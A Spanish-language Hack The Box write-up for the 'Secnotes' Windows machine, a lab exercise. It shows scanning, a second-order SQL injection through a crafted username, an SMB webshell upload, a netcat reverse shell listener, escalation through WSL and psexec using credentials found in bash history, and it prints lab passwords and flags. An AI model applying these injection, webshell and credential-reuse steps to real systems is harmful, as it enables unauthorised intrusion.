---
tags:
title: Secnotes - Medium (HTB)
permalink: /Secnotes-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p80,445,8808 10.129.235.5                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 16:55 EST
Nmap scan report for 10.129.235.5
Host is up (0.62s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-15T21:57:01
|_  start_date: N/A
|_clock-skew: mean: 2h41m24s, deviation: 4h37m10s, median: 1m22s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2025-12-15T13:56:59-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.39 seconds
```

## Website 

En la pagina principal hay un panel del `login` , y debido a que no tengo credenciales previas, y además habiendo intentado inyecciones `SQL`, me registre.

![[Pasted image 20251215185607.png]]

## Dashboard

En en panel principal veo que tengo varias opciones entre ellas las de crear notas.

![[Pasted image 20251215185838.png]]
### XSS

Al crear una nota con el siguiente payload para XSS se da dicha vulnerabilidad.

![[Pasted image 20251215190031.png]]
## Leak via SQL Injection.

Analizando como se procesan las notas, me di cuenta que por detrás debe correr una `query` como la siguiente.

```sql
SELECT * FROM notes WHERE username = 'test'
```

Donde selecciona el contenido completo de la nota y lo muestra en pantalla, por lo que se me ocurrió una manera de romper esta `query`, creando un usuario con el nombre `'or 1=1-- -` para poder hacer que devuelva un true, junto con todas las notas.
## Shell as tyler

Y Iniciando sesión como dicho usuario veo que se `leakean` unas credenciales del usuario `tyler` .

![[Pasted image 20251215195720.png]]
## SMB

Las credenciales son validas para el protocolo `smb`.

```bash
impacket-smbclient 'secnotes.htb/tyler:92g!mA8BGjOirkL%OG*&'@10.129.235.5 -dc-ip 10.129.235.5  
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use new-site
# ls
drw-rw-rw-          0  Sun Aug 19 14:06:14 2018 .
drw-rw-rw-          0  Sun Aug 19 14:06:14 2018 ..
-rw-rw-rw-        696  Thu Jun 21 16:15:36 2018 iisstart.htm
-rw-rw-rw-      98757  Thu Jun 21 16:15:38 2018 iisstart.png
```

Dentro del mismo veo el recuro compartido `new-site` con los archivos que se reflejan en el puerto `8808` de la maquina el cual corresponde al panel típico de `Windows IIS`, acá en donde se me ocurrió intentar subir una `webshell` al directorio de la maquina el cual después se pueda llegar accesible y pueda llegar a tener una ejecución de comandos.

Con el siguiente comando lo subí al `share` de la maquina.

```bash
# put cmd.php
```
Y desde la web obtuve ejecución de comandos

![[Pasted image 20251215201628.png]]

Por lo que me envie una shell a mi maquina usando el payload tipico de [Revshell.com](Revshell.com)

```powershell
rlwrap -cAr nc -nlvp 4444                         
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.235.5] 50833
whaomi
PS C:\inetpub\new-site> whoami
secnotes\tyler
```

```powershell
PS C:\users\tyler\desktop> cat user.txt
811934cd8ae98390103f846f3a47cb9a
```

## Shell as nt authority\system

Dentro de la maquina en donde veo en el directorio `raiz` que se usa `ubuntu` y probablemente se trate de un entorno `WSL`.

>El Subsistema de `Windows para Linux (WSL)` es una característica de Windows que permite ejecutar un entorno Linux completo (comandos, herramientas y aplicaciones) directamente en Windows, sin necesidad de una máquina virtual tradicional o configuración de arranque dual.

En mi caso por alguna razón con la shell que me envié con `powershell`, en el directorio `C:\Windows\System32` estaba el binario de `bash.exe`, el cual me permitía ver y usar el subsistema de `Linux` que tenia esta maquina.
Pero por alguna razón al querer ejecutarlo no me funcionaba por lo que use un bucle `while`, para buscar desde la raíz por dicho binario. Y es así como di con la ruta.

```powershell
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

Una vez lo ejecute me `upgradee` la shell a una `/bin/bash` con el comando en pantalla.

```bash
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device
python -c 'import pty; pty.spawn("/bin/bash")'
root@SECNOTES:~#
```
### History

Y viendo los archivos, veo que el `.bash_history` no esta con el típico `simlink` hacia `/dev/null`.

```bash
root@SECNOTES:~# ls -la
ls -la
total 8
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3112 Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem

```

Eso es raro, por lo que viendo el contenido, vi las credenciales del usuario `Administrator`.

```bash
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history

```
### psexec
Use las mismas para conectarme con `psexec` ya que el puerto del servicio `WinRM` no estaba habilitado desde fuera.

```powershell
impacket-psexec secnotes.htb/administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.235.5
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.235.5.....
[*] Found writable share ADMIN$
[*] Uploading file QnYZdirb.exe
[*] Opening SVCManager on 10.129.235.5.....
[*] Creating service YmPn on 10.129.235.5.....
[*] Starting service YmPn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop> type root.txt
0ab69ed1f87ac98076083429ce6fcf5a
```

`~Happy Hacking`